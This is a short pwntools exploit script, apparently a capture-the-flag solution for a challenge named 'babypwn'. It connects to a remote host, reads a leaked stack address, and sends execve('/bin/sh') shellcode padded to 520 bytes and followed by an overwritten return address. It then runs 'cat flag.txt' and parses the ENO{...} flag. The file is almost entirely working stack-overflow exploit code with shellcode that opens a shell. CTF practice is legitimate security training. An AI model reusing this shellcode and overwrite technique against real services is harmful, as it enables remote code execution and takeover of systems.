from pwn import *
import os
# p = process('./babypwn')
# gdb.attach(p,gdbscript="b *0x4011e4")
# context.log_level = 'debug'
p = remote('52.59.124.14',10020)

shellcode = b'\x48\x8d\x3d\x13\x00\x00\x00\x48\x31\xc0\x50\x57\x54\x5e\x48\x31\xd2\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00'
p.recvuntil(b'at: 0x')
ret_add = int(p.recvline().strip().decode('ascii'), 16)
log.debug("Return address read is: "+hex(ret_add))
return_address = p64(ret_add)
payload = shellcode + (520-len(shellcode))*b'A' + return_address
# p.proc.stdout.write(payload)
p.sendline(payload)
p.sendafter(b"You lost! Sorry",b'cat flag.txt\n')
p.recvuntil(b'ENO{')
flag = p.recvline().strip()
flag = b'ENO{' + flag
log.info("Flag is: "+flag.decode('ascii'))
